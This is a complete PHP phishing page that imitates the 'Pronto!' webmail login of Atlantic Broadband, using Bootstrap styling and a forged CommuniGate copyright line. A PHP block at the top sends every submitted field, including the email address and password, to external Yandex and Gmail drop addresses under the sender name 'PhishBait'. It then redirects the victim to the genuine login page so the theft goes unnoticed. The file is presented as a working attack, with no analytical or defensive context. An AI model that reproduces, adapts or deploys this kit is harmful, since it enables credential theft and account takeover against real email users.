<?php
if($_SERVER['REQUEST_METHOD'] == 'POST') {

  header('Location: https://mail.atlanticbb.net/hPronto/');
  $message = '';
  foreach($_POST as $variable => $value) {
  $message .= $variable.': '.$value."\r\n";}
  $header  = 'From: PhishBait <donotreply@pbmkr.vt>'."\r\n";
  $header .= 'Reply-To: donotreply@pbmkr.vt'."\r\n";
  $header .= 'MIME-Version: 1.0'."\r\n";
  $header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
  $header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
  $header .= 'X-Mailer: PHP v'.phpversion();
  mail('workwivawy@yandex.ru,infmaa77@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
  exit;
} 
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">
    <link rel="canonical" href="https://getbootstrap.com/docs/3.3/examples/signin/">

    <title>Pronto!</title>

     <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- Optional theme -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <style type="text/css">
      body {
        padding-top: 40px;
        padding-bottom: 40px;
        background-color: #eee;
        background-image: linear-gradient(#4e81be 0px, #214886 23px, #ffffff 150px);
        border-top: 5px solid #ff8e3f;
        background-color: #214886;
      }
      label{
        color: #7f7f7f;
      }

      .form-signin {
        max-width: 330px;
        padding: 15px;
        margin: 0 auto;
      }
      .form-signin .form-signin-heading,
      .form-signin .checkbox {
        margin-bottom: 10px;
      }
      .form-signin .checkbox {
        font-weight: normal;
      }
      .form-signin .form-control {
        position: relative;
        height: auto;
        -webkit-box-sizing: border-box;
           -moz-box-sizing: border-box;
                box-sizing: border-box;
        padding: 10px;
        font-size: 16px;
      }
      .form-signin .form-control:focus {
        z-index: 2;
      }
      .form-signin input[type="email"] {
        margin-bottom: -1px;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
      }
      .form-signin input[type="password"] {
        margin-bottom: 10px;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
    </style>
  </head>

  <body>

    <div class="container">

      <form class="form-horizontal" method="POST" action="<?php echo $_SERVER['PHP_SELF'] ?>">
        <center><img src="https://i.postimg.cc/0yBVM6VC/logo-big-fresh.png" width="200" style="margin-bottom: 15px;"></center>
        <div class="form-group">
          <label class="control-label col-sm-4" for="email">Email Address:</label>
          <div class="col-sm-4">
            <input type="email" class="form-control input-lg" id="email"  name="email">
          </div>
        </div>

        <div class="form-group">
          <label class="control-label col-sm-4" for="pwd">Password:</label>
          <div class="col-sm-4">          
            <input type="password" class="form-control input-lg" id="pwd" name="pwd">
          </div>
        </div>
        <div class="row">
          <div class="col-sm-4"></div>
          <div class="col-sm-4">
            <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          </div>
          <div class="col-sm-4"></div>
            
        </div>
        <br/>
      </form>
        <div style="text-align:center; padding-top: 20px; padding-bottom: 20px"><a href="">Forgotten Password Recovery</a></div>
        <div style="margin-top: 50px; margin-bottom: 30px;">
          <p>Copyright &copy; <script>document.write(new Date().getFullYear());</script>, CommuniGate Software Development and Licensing SA</p>
        </div>
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
